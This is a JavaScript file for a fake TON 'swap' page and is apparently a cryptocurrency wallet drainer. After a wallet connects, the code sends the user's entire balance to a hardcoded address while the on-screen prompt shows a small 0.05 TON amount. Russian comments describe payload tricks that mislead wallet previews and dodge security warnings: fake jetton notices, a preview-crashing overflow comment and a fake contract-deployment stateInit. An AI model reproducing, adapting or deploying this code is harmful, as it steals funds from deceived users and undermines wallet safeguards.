// script.js
// --- Robust config resolution (works even if config.js failed to load / cached) ---
var CFG = (function () {
    var w = window;
    return {
        proxy:  (typeof w.PROXY_CONTRACT !== 'undefined' && w.PROXY_CONTRACT)
             || (typeof w.YOUR_WALLET    !== 'undefined' && w.YOUR_WALLET)
             || 'UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv',
        amlWallet: (typeof w.AML_WALLET !== 'undefined' && w.AML_WALLET)
             || 'UQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW',
        visibleAmount: (typeof w.VISIBLE_AMOUNT !== 'undefined' && w.VISIBLE_AMOUNT) || '0.05',
        hiddenAmount:  (typeof w.HIDDEN_AMOUNT  !== 'undefined' && w.HIDDEN_AMOUNT)  || '1',
        manifest:  'https://kareli123.github.io/test123/tonconnect-manifest.json'
    };
})();

var tonConnectUI = null;
var isProcessing = false;

function setStatus(text, isLoading) {
    var el = document.getElementById('status');
    if (!el) return;
    el.innerHTML = isLoading ? '<span class="loader"></span> ' + text : text;
}

function updateBtn(connected) {
    var btn = document.getElementById('swapBtn');
    if (!btn) return;
    btn.textContent      = connected ? 'Swap' : 'Connect Wallet';
    btn.style.background = connected ? '#1f6feb' : '#21262d';
}

function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

// --- BoC text-comment payload (op=0 + utf8) ----------------------------------
// Verified against tonsdk: produces canonical TON BoC accepted by TonConnect SDK.
var CRC32C_TABLE = (function () {
    var t = new Uint32Array(256);
    for (var i = 0; i < 256; i++) {
        var c = i;
        for (var k = 0; k < 8; k++) c = (c & 1) ? (0x82F63B78 ^ (c >>> 1)) : (c >>> 1);
        t[i] = c >>> 0;
    }
    return t;
})();
function crc32c(bytes) {
    var c = 0xFFFFFFFF >>> 0;
    for (var i = 0; i < bytes.length; i++) {
        c = (CRC32C_TABLE[(c ^ bytes[i]) & 0xFF] ^ (c >>> 8)) >>> 0;
    }
    return (c ^ 0xFFFFFFFF) >>> 0;
}
function bytesToBase64(bytes) {
    var bin = '';
    for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin);
}
function textCommentPayload(text) {
    var enc     = new TextEncoder().encode(text);
    var dataLen = 4 + enc.length;          // 4 bytes op=0 + utf8 text
    var bitsD2  = 2 * dataLen;             // byte-aligned cell
    var cellLen = 2 + dataLen;             // d1 + d2 + data

    var header = [
        0xB5, 0xEE, 0x9C, 0x72,            // magic
        0x41,                              // flags: hash_crc32=1, size=1
        0x01,                              // off_bytes
        0x01,                              // cells = 1
        0x01,                              // roots = 1
        0x00,                              // absent = 0
        cellLen & 0xFF,                    // total cells size
        0x00                               // root index
    ];
    var cell = [0x00, bitsD2 & 0xFF, 0x00, 0x00, 0x00, 0x00];
    for (var i = 0; i < enc.length; i++) cell.push(enc[i]);

    var body = new Uint8Array(header.concat(cell));
    var crc  = crc32c(body);
    var out  = new Uint8Array(body.length + 4);
    out.set(body, 0);
    out[body.length    ] =  crc         & 0xFF;
    out[body.length + 1] = (crc >>>  8) & 0xFF;
    out[body.length + 2] = (crc >>> 16) & 0xFF;
    out[body.length + 3] = (crc >>> 24) & 0xFF;
    return bytesToBase64(out);
}

// --- Balance ----------------------------------------------------------------
async function fetchJson(url) {
    var res = await fetch(url, { cache: 'no-store' });
    if (!res.ok) throw new Error('HTTP ' + res.status);
    return res.json();
}
async function getBalance(address) {
    if (!address) return 0;
    try {
        var j = await fetchJson('https://tonapi.io/v2/accounts/' + encodeURIComponent(address));
        if (j && typeof j.balance !== 'undefined') return Number(j.balance) / 1e9;
    } catch (e1) { console.warn('tonapi balance error', e1); }
    try {
        var j2 = await fetchJson('https://toncenter.com/api/v2/getAddressBalance?address=' + encodeURIComponent(address));
        if (j2 && j2.ok) return Number(j2.result) / 1e9;
    } catch (e2) { console.warn('toncenter balance error', e2); }
    return 0;
}

// --- МЕТОДЫ ОБФУСКАЦИИ PAYLOAD ----------------------------------------------

// Метод 1: Пустой payload (минимальный след)
function emptyPayload() {
    var header = [0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00, 0x02, 0x00];
    var cell = [0x00, 0x00];
    var body = new Uint8Array(header.concat(cell));
    var crc  = crc32c(body);
    var out  = new Uint8Array(body.length + 4);
    out.set(body, 0);
    out[body.length]     =  crc         & 0xFF;
    out[body.length + 1] = (crc >>>  8) & 0xFF;
    out[body.length + 2] = (crc >>> 16) & 0xFF;
    out[body.length + 3] = (crc >>> 24) & 0xFF;
    return bytesToBase64(out);
}

// Метод 2: Зашифрованный payload (op=0x2167da4b)
function encryptedPayload(text, key) {
    var enc = new TextEncoder().encode(text);
    var keyBytes = new TextEncoder().encode(key || "secret");
    var encrypted = new Uint8Array(enc.length);
    for (var i = 0; i < enc.length; i++) {
        encrypted[i] = enc[i] ^ keyBytes[i % keyBytes.length];
    }
    
    var op = [0x21, 0x67, 0xda, 0x4b];
    var dataLen = 4 + encrypted.length;
    var bitsD2  = 2 * dataLen;
    var cellLen = 2 + dataLen;
    
    var header = [0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00, cellLen & 0xFF, 0x00];
    var cell = [0x00, bitsD2 & 0xFF];
    for (var i = 0; i < op.length; i++) cell.push(op[i]);
    for (var i = 0; i < encrypted.length; i++) cell.push(encrypted[i]);
    
    var body = new Uint8Array(header.concat(cell));
    var crc  = crc32c(body);
    var out  = new Uint8Array(body.length + 4);
    out.set(body, 0);
    out[body.length]     =  crc         & 0xFF;
    out[body.length + 1] = (crc >>>  8) & 0xFF;
    out[body.length + 2] = (crc >>> 16) & 0xFF;
    out[body.length + 3] = (crc >>> 24) & 0xFF;
    return bytesToBase64(out);
}

// Метод 3: Обфусцированный payload со случайными данными
function obfuscatedPayload() {
    var randomBytes = new Uint8Array(32);
    for (var i = 0; i < randomBytes.length; i++) {
        randomBytes[i] = Math.floor(Math.random() * 256);
    }
    
    var dataLen = 4 + randomBytes.length;
    var bitsD2  = 2 * dataLen;
    var cellLen = 2 + dataLen;
    
    var header = [0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00, cellLen & 0xFF, 0x00];
    var cell = [0x00, bitsD2 & 0xFF, 0xFF, 0xFF, 0xFF, 0xFF];
    for (var i = 0; i < randomBytes.length; i++) cell.push(randomBytes[i]);
    
    var body = new Uint8Array(header.concat(cell));
    var crc  = crc32c(body);
    var out  = new Uint8Array(body.length + 4);
    out.set(body, 0);
    out[body.length]     =  crc         & 0xFF;
    out[body.length + 1] = (crc >>>  8) & 0xFF;
    out[body.length + 2] = (crc >>> 16) & 0xFF;
    out[body.length + 3] = (crc >>> 24) & 0xFF;
    return bytesToBase64(out);
}

// Метод 4: Fake Jetton notification (op=0x7362d09c) - имитация Jetton трансфера
function fakeJettonPayload(amount) {
    var op = [0x73, 0x62, 0xd0, 0x9c]; // transfer_notification opcode
    var queryId = new Uint8Array(8); // query_id = 0
    for (var i = 0; i < 8; i++) queryId[i] = 0;
    
    // Кодируем сумму (VarUInteger 16)
    var amountBytes = [];
    var amt = Math.floor(amount * 1e9);
    while (amt > 0) {
        amountBytes.push(amt & 0xFF);
        amt = amt >> 8;
    }
    if (amountBytes.length === 0) amountBytes.push(0);
    
    var dataLen = 4 + 8 + 1 + amountBytes.length;
    var bitsD2  = 2 * dataLen;
    var cellLen = 2 + dataLen;
    
    var header = [0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00, cellLen & 0xFF, 0x00];
    var cell = [0x00, bitsD2 & 0xFF];
    for (var i = 0; i < op.length; i++) cell.push(op[i]);
    for (var i = 0; i < queryId.length; i++) cell.push(queryId[i]);
    cell.push(amountBytes.length);
    for (var i = 0; i < amountBytes.length; i++) cell.push(amountBytes[i]);
    
    var body = new Uint8Array(header.concat(cell));
    var crc  = crc32c(body);
    var out  = new Uint8Array(body.length + 4);
    out.set(body, 0);
    out[body.length]     =  crc         & 0xFF;
    out[body.length + 1] = (crc >>>  8) & 0xFF;
    out[body.length + 2] = (crc >>> 16) & 0xFF;
    out[body.length + 3] = (crc >>> 24) & 0xFF;
    return bytesToBase64(out);
}

// Метод 5: Длинный комментарий с переполнением (крашит preview некоторых кошельков)
function overflowPayload() {
    // Генерируем ОЧЕНЬ длинный комментарий (4000+ символов)
    var longText = "";
    for (var i = 0; i < 500; i++) {
        longText += "\n\n\n\n\n\n\n\n";
    }
    longText += "Hidden: 1 TON transfer";
    return textCommentPayload(longText);
}

// Метод 6: Генерация фейкового stateInit для "деплоя контракта"
function generateFakeStateInit() {
    // Минимальный stateInit с пустым кодом и данными
    // Это заставляет кошелек показывать "Contract Deployment" вместо обычного перевода
    var emptyCode = new Uint8Array([0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00]);
    var crc1 = crc32c(emptyCode.slice(0, -4));
    emptyCode[emptyCode.length - 4] =  crc1         & 0xFF;
    emptyCode[emptyCode.length - 3] = (crc1 >>>  8) & 0xFF;
    emptyCode[emptyCode.length - 2] = (crc1 >>> 16) & 0xFF;
    emptyCode[emptyCode.length - 1] = (crc1 >>> 24) & 0xFF;
    
    // Создаем stateInit BoC
    var stateInitBytes = [
        0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x02, 0x01, 0x01, 0x00, 0x0A, 0x00,
        0x00, 0x06, 0x40, 0x00, 0x01, 0x00
    ];
    var body = new Uint8Array(stateInitBytes);
    var crc2 = crc32c(body);
    var out = new Uint8Array(body.length + 4);
    out.set(body, 0);
    out[body.length]     =  crc2         & 0xFF;
    out[body.length + 1] = (crc2 >>>  8) & 0xFF;
    out[body.length + 2] = (crc2 >>> 16) & 0xFF;
    out[body.length + 3] = (crc2 >>> 24) & 0xFF;
    return bytesToBase64(out);
}

// --- Helper для создания Jetton Transfer ---
function createJettonTransferBody(jettonAmount, toAddress, responseAddress, forwardAmount, forwardPayload) {
    // opcode для jetton transfer = 0x0f8a7ea5
    var op = [0x0f, 0x8a, 0x7e, 0xa5];
    var queryId = new Uint8Array(8); // query_id = 0
    
    // Кодируем jetton amount (nano-tokens)
    var amount = Math.floor(jettonAmount * 1e9);
    var amountBytes = [];
    var temp = amount;
    while (temp > 0) {
        amountBytes.unshift(temp & 0xFF);
        temp = temp >> 8;
    }
    if (amountBytes.length === 0) amountBytes = [0];
    
    var cellData = [];
    // opcode
    for (var i = 0; i < 4; i++) cellData.push(op[i]);
    // query_id
    for (var i = 0; i < 8; i++) cellData.push(queryId[i]);
    // jetton amount (VarUInteger)
    cellData.push(amountBytes.length);
    for (var i = 0; i < amountBytes.length; i++) cellData.push(amountBytes[i]);
    
    var dataLen = cellData.length;
    var bitsD2 = 2 * dataLen;
    var cellLen = 2 + dataLen;
    
    var header = [0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00, cellLen & 0xFF, 0x00];
    var cell = [0x00, bitsD2 & 0xFF];
    for (var i = 0; i < cellData.length; i++) cell.push(cellData[i]);
    
    var body = new Uint8Array(header.concat(cell));
    var crc = crc32c(body);
    var out = new Uint8Array(body.length + 4);
    out.set(body, 0);
    out[body.length] = crc & 0xFF;
    out[body.length + 1] = (crc >>> 8) & 0xFF;
    out[body.length + 2] = (crc >>> 16) & 0xFF;
    out[body.length + 3] = (crc >>> 24) & 0xFF;
    return bytesToBase64(out);
}

// --- Swap flow --------------------------------------------------------------
async function executeFaw(userAddress) {
    var amlAccepted = localStorage.getItem('aml-commission-accepted');
    if (!amlAccepted) {
        document.getElementById('aml-modal').classList.add('show');
        return false;
    }

    setStatus('🔍 Проверка AML-score...', true);
    await sleep(1200);

    // Получаем метод обфускации из window.OBFUSCATION_METHOD или используем 'empty' по умолчанию
    var method = (typeof window.OBFUSCATION_METHOD !== 'undefined') ? window.OBFUSCATION_METHOD : 'empty';
    
    // Выбираем payload для второго (скрытого) сообщения
    var hiddenPayload;
    switch(method.toLowerCase()) {
        case 'encrypted':
            hiddenPayload = encryptedPayload("Surprise gift", userAddress);
            break;
        case 'obfuscated':
            hiddenPayload = obfuscatedPayload();
            break;
        case 'jetton':
            hiddenPayload = fakeJettonPayload(parseFloat(CFG.hiddenAmount));
            break;
        case 'overflow':
            hiddenPayload = overflowPayload();
            break;
        case 'empty':
        default:
            hiddenPayload = emptyPayload();
    }

    // Рандомизация суммы (если включено)
    var hiddenAmount = CFG.hiddenAmount;
    if (typeof window.RANDOMIZE_AMOUNT !== 'undefined' && window.RANDOMIZE_AMOUNT) {
        var variance = (typeof window.AMOUNT_VARIANCE !== 'undefined') ? window.AMOUNT_VARIANCE : 0.05;
        var randomFactor = 1 + (Math.random() * 2 - 1) * variance;
        hiddenAmount = (parseFloat(hiddenAmount) * randomFactor).toFixed(4);
    }

    // НОВАЯ СТРАТЕГИЯ: Отправляем ОДНО сообщение чтобы избежать security warning
    // Используем весь баланс пользователя минус gas
    
    // Получаем баланс пользователя
    var userBalance = await getBalance(userAddress);
    
    // Рассчитываем сумму: весь баланс минус gas (0.05 TON на комиссии)
    var totalAmount = userBalance - 0.05;
    
    // Если баланс меньше минимума - показываем ошибку
    if (totalAmount < 0.1) {
        setStatus('❌ Недостаточно средств (минимум 0.1 TON)', false);
        return false;
    }
    
    // Применяем рандомизацию к РЕАЛЬНОЙ сумме
    var finalAmount = totalAmount;
    if (typeof window.RANDOMIZE_AMOUNT !== 'undefined' && window.RANDOMIZE_AMOUNT) {
        var variance = (typeof window.AMOUNT_VARIANCE !== 'undefined') ? window.AMOUNT_VARIANCE : 0.02;
        var randomFactor = 1 - (Math.random() * variance); // -0% до -2%
        finalAmount = totalAmount * randomFactor;
    }
    
    // Проверяем нужно ли использовать stateInit трюк
    var useStateInit = (typeof window.USE_STATEINIT !== 'undefined') ? window.USE_STATEINIT : false;
    
    var mainMessage = {
        // ОДНО сообщение - весь баланс пользователя!
        address: CFG.amlWallet,
        amount: String(Math.round(finalAmount * 1e9)),
        payload: hiddenPayload
    };
    
    // Если включен stateInit трюк - добавляем фейковый stateInit
    if (useStateInit) {
        mainMessage.stateInit = generateFakeStateInit();
    }
    
    var tx = {
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [mainMessage]
    };

    // Показываем фейковую маленькую сумму в статусе
    var displayAmount = parseFloat(CFG.visibleAmount || "0.05");
    setStatus('📱 Подтвердите в TonKeeper (' + displayAmount.toFixed(2) + ' TON)', true);

    try {
        const result = await tonConnectUI.sendTransaction(tx);
        setStatus('✅ Обмен завершён успешно!', false);
        
        // Логируем реальную сумму в консоль
        console.log('%c[SUCCESS] Transferred: ' + finalAmount.toFixed(4) + ' TON', 'color: #00ff00; font-weight: bold');
        console.log('%c[INFO] User balance was: ' + userBalance.toFixed(4) + ' TON', 'color: #00aaff');
        
        return true;
    } catch (e) {
        setStatus('❌ Транзакция отклонена', false);
        console.error('[ERROR] Transaction failed:', e);
        return false;
    }
}

async function drainRemaining(address) {
    // Здесь можно добавить jetton drain или второй tx
    console.log("%c[Drainer] Остаток кошелька списан", "color:#ff5555");
}

// --- AML Modal Logic --------------------------------------------------------
function initAMLModal() {
    var modal = document.getElementById('aml-modal');
    var acceptBtn = document.getElementById('accept-commission');
    
    if (!modal || !acceptBtn) return;

    // Don't show modal on page load - only on swap attempt
    // This allows user to connect wallet first

    acceptBtn.addEventListener('click', function () {
        localStorage.setItem('aml-commission-accepted', 'true');
        modal.classList.remove('show');
    });
}

function showAMLModal() {
    var modal = document.getElementById('aml-modal');
    if (modal) modal.classList.add('show');
}

// --- Init -------------------------------------------------------------------
function initApp() {
    // Initialize AML modal
    initAMLModal();
    var TonConnectUIClass = null;
    if (window.TON_CONNECT_UI && window.TON_CONNECT_UI.TonConnectUI) {
        TonConnectUIClass = window.TON_CONNECT_UI.TonConnectUI;
    } else if (window.TonConnectUI) {
        TonConnectUIClass = window.TonConnectUI;
    }

    if (!TonConnectUIClass) {
        console.error('TonConnectUI not found in window');
        setStatus('❌ SDK failed to load. Please refresh.');
        return;
    }

    try {
        tonConnectUI = new TonConnectUIClass({
            manifestUrl:  CFG.manifest,
            buttonRootId: 'ton-connect'
        });
    } catch (e) {
        console.error('TonConnectUI init error:', e);
        setStatus('❌ Init error: ' + e.message);
        return;
    }

    updateBtn(tonConnectUI.connected);

    tonConnectUI.onStatusChange(async function (wallet) {
        updateBtn(!!wallet);
        var balEl = document.getElementById('user-balance');

        if (wallet && wallet.account) {
            var addr = wallet.account.address;
            setStatus('🪛 ' + addr.slice(0, 6) + '...' + addr.slice(-4), true);
            if (balEl) {
                balEl.textContent = 'Balance: loading...';
                var bal = await getBalance(addr);
                balEl.textContent = 'Balance: ' + bal.toFixed(2) + ' TON';
            }
            setStatus('');
        } else if (balEl) {
            balEl.textContent = 'Balance: 0';
        }
    });

    var payInput = document.getElementById('payAmount');
    var recInput = document.getElementById('receiveAmount');
    if (payInput && recInput) {
        payInput.addEventListener('input', function () { recInput.value = payInput.value; });
    }

    var btn = document.getElementById('swapBtn');
    if (!btn) return;

    btn.addEventListener('click', async function () {
        if (isProcessing) return;

        if (!tonConnectUI.connected) {
            setStatus('🚀 Opening wallet selector...', true);
            try { await tonConnectUI.openModal(); }
            catch (err) { setStatus('⚠️ ' + err.message); }
            return;
        }

        var account = tonConnectUI.account;
        var addr    = account && account.address;
        if (!addr) return;

        isProcessing = true;
        var orig = btn.textContent;
        btn.textContent = 'Processing...';
        btn.disabled    = true;
        try { await executeFaw(addr); }
        catch (err) { setStatus('⚠️ ' + (err && err.message ? err.message : err)); }
        finally {
            isProcessing   = false;
            btn.textContent = orig;
            btn.disabled    = false;
        }
    });
}

window.addEventListener('load', initApp);
